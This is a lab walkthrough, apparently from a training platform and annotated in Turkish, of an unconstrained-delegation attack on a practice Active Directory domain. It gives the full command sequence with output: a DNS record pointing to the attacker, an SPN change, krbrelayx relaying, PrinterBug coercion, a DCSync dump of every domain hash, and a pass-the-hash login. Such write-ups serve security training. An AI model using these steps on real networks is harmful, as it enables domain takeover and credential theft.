# Unconstrained Delegation for Users

## Hosts File

```sh
my@attack:~$ echo "10.129.101.48 inlanefreight.local dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Enumeration

### Impacket

```sh
my@attack:~$ findDelegation.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine'
```

```output title="Output" hl_lines="3"
AccountName    AccountType  DelegationType                      DelegationRightsTo                SPN Exists
-------------  -----------  ----------------------------------  --------------------------------  ----------
callum.dixon   Person       Unconstrained                       N/A                               No
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01.INLANEFREIGHT.LOCAL  Yes
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01                      Yes
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01.INLANEFREIGHT.LOCAL      No
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01                          No
SQL01$         Computer     Unconstrained                       N/A                               Yes
```

### windapsearch

```sh
my@attack:~$ windapsearch.py --dc-ip 10.129.101.48 -d INLANEFREIGHT.LOCAL -u INLANEFREIGHT\\'carole.rose' --unconstrained-users
```

```output title="Output" hl_lines="10"
[+] Using Domain Controller at: 10.129.101.48
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\carole.rose
[+] Attempting to enumerate all user objects with unconstrained delegation
[+]     Found 1 Users with unconstrained delegation:

CN=callum.dixon,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

## Creating a Fake DNS Record

| A RECORD | ATTACK MACHINE | NAME SERVER |
|---|---|---|
| GIBBERISH.INLANEFREIGHT.LOCAL | 10.10.14.106 | 10.129.101.48 |

```sh
my@attack:~$ dnstool.py 10.129.101.48 -u INLANEFREIGHT.LOCAL\\'carole.rose' -p 'jasmine' --record GIBBERISH.INLANEFREIGHT.LOCAL --data 10.10.14.106 --action add
```

```output title="Output"
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

## Verifying the Record

```sh
my@attack:~$ dig GIBBERISH.INLANEFREIGHT.LOCAL @DC01.INLANEFREIGHT.LOCAL
```

```zone title="Output" hl_lines="15"
; <<>> DiG 9.20.4 <<>> GIBBERISH.INLANEFREIGHT.LOCAL @DC01.INLANEFREIGHT.LOCAL
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62313
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;GIBBERISH.INLANEFREIGHT.LOCAL. IN      A

;; ANSWER SECTION:
GIBBERISH.INLANEFREIGHT.LOCAL. 180 IN   A       10.10.14.106

;; Query time: 186 msec
;; SERVER: 10.129.101.48#53(DC01.INLANEFREIGHT.LOCAL) (UDP)
;; WHEN: Sun Jan 26 21:37:40 +03 2025
;; MSG SIZE  rcvd: 74
```

## Modifying SPN for Callum Dixon

!!! warning

    Carole Rose hesabı Callum Dixon hesabı üzerinde [GenericWrite](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-9.0) ayrıcalığına sahiptir.

```sh
my@attack:~$ addspn.py -u INLANEFREIGHT.LOCAL\\'carole.rose' -p 'jasmine' --target-type samname --target callum.dixon --spn cifs/GIBBERISH.INLANEFREIGHT.LOCAL DC01.INLANEFREIGHT.LOCAL
```

```output title="Output"
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

## Password to NT Hash

!!! warning

    Callum Dixon hesabı daha önceden ele geçirildi.

### OpenSSL Legacy

```sh
my@attack:~$ printf 'C@lluMDIXON' | iconv -t UTF-16LE | openssl dgst -md4 -provider legacy
```

```output title="Output"
MD4(stdin)= 3e7c48255206470a13543b27b7af18de
```

### [PyPyKatz](https://github.com/skelsec/pypykatz)

```sh
my@attack:~$ pypykatz crypto nt 'C@lluMDIXON'
```

```output title="Output"
3e7c48255206470a13543b27b7af18de
```

### CyberChef

| OPERATION | INPUT | OUTPUT |
|---|---|---|
| NT Hash | C@lluMDIXON | 3E7C48255206470A13543B27B7AF18DE |

## Starting the Server

!!! warning

    Komutun hata üretmesi halinde mevcut [Impacket](https://github.com/fortra/impacket) kurulumu kaldırılır. Ardından güncel klon için kurulum gerçekleştirilir:

    ```sh
    my@attack:~$ sudo git clone https://github.com/fortra/impacket.git
    my@attack:~$ sudo cd impacket
    my@attack:~/impacket$ sudo pip3 install .
    ```

```sh
my@attack:~$ sudo krbrelayx.py -hashes :3E7C48255206470A13543B27B7AF18DE --target DC01.INLANEFREIGHT.LOCAL
```

## PrinterBug

!!! success

    * DC01 bilgisayarı GIBBERISH bilgisayarı üzerinde kimlik doğrular (SMB zorlama).
    * GIBBERISH bilgisayarı 10.10.14.106 adresine (Krbrelayx) çözülür.
    * DC01 bilgisayarı tarafından TGS bileti gönderilir.
    * Elde edilen bilet içerisinden çıkarılan TGT, CCACHE dosyası olarak kaydedilir.

### [Krbrelayx](https://github.com/dirkjanm/krbrelayx) Toolkit

| TARGET | ATTACK MACHINE |
|---|---|
| DC01.INLANEFREIGHT.LOCAL | GIBBERISH.INLANEFREIGHT.LOCAL |

```sh
my@attack:~$ printerbug.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine'@DC01.INLANEFREIGHT.LOCAL GIBBERISH.INLANEFREIGHT.LOCAL
```

### [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py)

| ATTACK MACHINE | TARGET |
|---|---|
| GIBBERISH.INLANEFREIGHT.LOCAL | DC01.INLANEFREIGHT.LOCAL |

```sh
my@attack:~$ dementor.py -u 'carole.rose' -p 'jasmine' --domain INLANEFREIGHT.LOCAL GIBBERISH.INLANEFREIGHT.LOCAL DC01.INLANEFREIGHT.LOCAL
```

## DCSync

!!! success

    Sunucu tarafında yakalanan ve kaydedilen CCACHE dosyası kullanılarak saldırı gerçekleştirilir.

```sh
my@attack:~$ export KRB5CCNAME='DC01$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache'
my@attack:~$ secretsdump.py DC01.INLANEFREIGHT.LOCAL -just-dc-ntlm -k -no-pass
```

```output title="Output" hl_lines="3"
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a83b750679b1789e29e966d06c7e41f7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c0231bd8a4a4de92fca0760c0ba9e7a6:::
derek.walker:1105:aad3b435b51404eeaad3b435b51404ee:69cc8c83c56aeeb7571bbeec20c6ef65:::
carole.holmes:1106:aad3b435b51404eeaad3b435b51404ee:37ef72fcf42a4021948c7ed7b33ccf21:::
callum.dixon:1107:aad3b435b51404eeaad3b435b51404ee:3e7c48255206470a13543b27b7af18de:::
beth.richards:1108:aad3b435b51404eeaad3b435b51404ee:de3d16603d7ded97bb47cd6641b1a392:::
amber.smith:1109:aad3b435b51404eeaad3b435b51404ee:455d95d9e62de715ffd82278312abb82:::
jenna.smith:1110:aad3b435b51404eeaad3b435b51404ee:234e91ec170ef89501b70cd4b6593d86:::
carole.rose:1111:aad3b435b51404eeaad3b435b51404ee:1d1998b165c6f302bd1d6f89ecce153d:::
sqldev:1112:aad3b435b51404eeaad3b435b51404ee:234e91ec170ef89501b70cd4b6593d86:::
sqlprod:1113:aad3b435b51404eeaad3b435b51404ee:234e91ec170ef89501b70cd4b6593d86:::
sqlqa:1114:aad3b435b51404eeaad3b435b51404ee:234e91ec170ef89501b70cd4b6593d86:::
sql-test:1115:aad3b435b51404eeaad3b435b51404ee:234e91ec170ef89501b70cd4b6593d86:::
adam.jones:1116:aad3b435b51404eeaad3b435b51404ee:d33b15ba0f27dbf0fd56cd54b1db1ade:::
jacob.kelly:1117:aad3b435b51404eeaad3b435b51404ee:e08847c1090227cb3a9ad59893094b32:::
INLANEFREIGHT.LOCAL\daniel.whitehead:1122:aad3b435b51404eeaad3b435b51404ee:c20b03e50b0d3c12e80cc38f959ead95:::
INLANEFREIGHT.LOCAL\annette.jackson:1123:aad3b435b51404eeaad3b435b51404ee:c20b03e50b0d3c12e80cc38f959ead95:::
INLANEFREIGHT.LOCAL\sandra.murphy:1124:aad3b435b51404eeaad3b435b51404ee:c20b03e50b0d3c12e80cc38f959ead95:::
INLANEFREIGHT.LOCAL\debra.rogers:1125:aad3b435b51404eeaad3b435b51404ee:c20b03e50b0d3c12e80cc38f959ead95:::
INLANEFREIGHT.LOCAL\htb-student:1126:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
INLANEFREIGHT.LOCAL\brian.willis:1127:aad3b435b51404eeaad3b435b51404ee:8883a4229c5553c9cca6856a53011e4c:::
INLANEFREIGHT.LOCAL\matilda.kens:2103:aad3b435b51404eeaad3b435b51404ee:3f6bec29611637432bf1e50e3fd0677d:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:c46ad88a9d75f3733aac2b8f882120d5:::
DMZ01$:1118:aad3b435b51404eeaad3b435b51404ee:81322a06e7a6d0f8764531bc8c52fa66:::
SQL01$:1119:aad3b435b51404eeaad3b435b51404ee:027c6604526b7b16a22e320b76e54a5b:::
WS01$:1120:aad3b435b51404eeaad3b435b51404ee:28cc66d9f24ce45d30101ca9e4560fe1:::
FILER01$:1121:aad3b435b51404eeaad3b435b51404ee:3f1d5bba37bdca3a16726369b0b1689b:::
```

## Pass-the-Hash

```sh
my@attack:~$ evil-winrm -i DC01.INLANEFREIGHT.LOCAL -u 'Administrator@INLANEFREIGHT.LOCAL' -H A83B750679B1789E29E966D06C7E41F7
```
